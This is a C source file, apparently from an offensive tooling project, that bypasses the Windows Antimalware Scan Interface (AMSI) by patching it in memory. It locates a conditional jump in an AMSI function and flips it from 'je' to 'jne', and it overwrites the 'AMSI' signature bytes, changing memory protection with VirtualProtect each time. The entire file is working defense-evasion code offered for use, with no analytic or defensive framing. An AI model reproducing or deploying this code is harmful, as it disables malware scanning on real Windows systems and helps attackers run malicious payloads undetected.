#include "amsi_bypass.h"

BOOL VerifyAddress (IN PBYTE pAddress) {

	PBYTE	pMovIns		= NULL;
	BYTE	bOffset		= 0x00;

	// Initial Check
	if (*(PBYTE)pAddress != x64_JE_INSTRUCTION_OPCODE)
		return FALSE;

	// Calculate the offset of the jump address
	// Adding 1 to skip the 'je' instruction
	bOffset = *(PBYTE)(pAddress + sizeof(BYTE));

	// Add the offset to the address following the 'je offset' instruction
	// Adding 2 to skip the 'je offset' statement
	pMovIns = (PBYTE)(pAddress + (sizeof(BYTE) * 2) + bOffset);

	// Return true if the first instruction is found to be a 'mov' instruction
	return *(PBYTE)pMovIns == x64_MOV_INSTRUCTION_OPCODE ? TRUE : FALSE;
}

BOOL JnePatchAmsiFunction(IN PBYTE pAmsiFunctionAddress) {
    PBYTE		px74Opcode			= NULL;
	DWORD		i					= 0x00,
				dwOldProtection		= 0x00;
	
	if (!pAmsiFunctionAddress) 
		return FALSE;

	// A while-loop to find the last 'ret' instruction
	while (1) {
		if (pAmsiFunctionAddress[i] == x64_RET_INSTRUCTION_OPCODE && pAmsiFunctionAddress[i + 1] == x64_INT3_INSTRUCTION_OPCODE && pAmsiFunctionAddress[i + 2] == x64_INT3_INSTRUCTION_OPCODE)
			break;
		i++;
	}

	// Searching upwards for the first 'je' instruction
	while (i) {

		if (VerifyAddress(&pAmsiFunctionAddress[i])) {
			px74Opcode = &pAmsiFunctionAddress[i];
			break;
		}

		i--;
	}

	DebugPrint("\t[+] 'je' Insruction Found At: 0x%p \n", px74Opcode);

	if (!px74Opcode)
		return FALSE;

	DebugPrint("\t[i] Replacing JE with JNE Instruction ... ");

	// Change memory permissions to RWX
	if (!VirtualProtect(px74Opcode, 0x01, PAGE_READWRITE, &dwOldProtection))
		return FALSE;

	// Apply the patch
	*(BYTE*)px74Opcode = x64_JNE_INSTRUCTION_OPCODE;

	// Change memory permissions to original
	if (!VirtualProtect(px74Opcode, 0x01, dwOldProtection, &dwOldProtection))
		return FALSE;

	DebugPrint("[+] DONE \n");

	return TRUE;
}

BOOL PatchAmsiSignature(IN PBYTE pAmsiFunctionAddress) {
	

	PBYTE		pAmsiSignature		= NULL;
	DWORD		i					= 0x00,
				dwOldProtection		= 0x00;

	if (!pAmsiFunctionAddress)
		return FALSE;

	// A while-loop to find the last 'ret' instruction
	while (1) {
		if (pAmsiFunctionAddress[i] == x64_RET_INSTRUCTION_OPCODE && pAmsiFunctionAddress[i + 1] == x64_INT3_INSTRUCTION_OPCODE && pAmsiFunctionAddress[i + 2] == x64_INT3_INSTRUCTION_OPCODE)
			break;
		i++;
	}

	// Searching again for the amsi signature address
	for (DWORD x = 0; x < i; x++){
		if (*(ULONG*)(pAmsiFunctionAddress + x) == AMSI_SIGNATURE) {
			pAmsiSignature = &pAmsiFunctionAddress[x];
			break;
		}
	}

	DebugPrint("\t[+] Amsi Signature Found At: 0x%p \n", pAmsiSignature);

	if (!pAmsiSignature)
		return FALSE;

	DebugPrint("\t[i] Replacing The Amsi Signature [41 4D 53 49] with [43 4D 53 49] ... ");

	// Change memory permissions to RWX
	if (!VirtualProtect(pAmsiSignature, 0x01, PAGE_EXECUTE_READWRITE, &dwOldProtection))
		return FALSE;

	// Apply the patch - Replacing the first byte in the original signature to a random byte
	*(BYTE*)pAmsiSignature = 0x43;

	// Change memory permissions to original
	if (!VirtualProtect(pAmsiSignature, 0x01, dwOldProtection, &dwOldProtection))
		return FALSE;

	DebugPrint("[+] DONE \n");

	return TRUE;
}
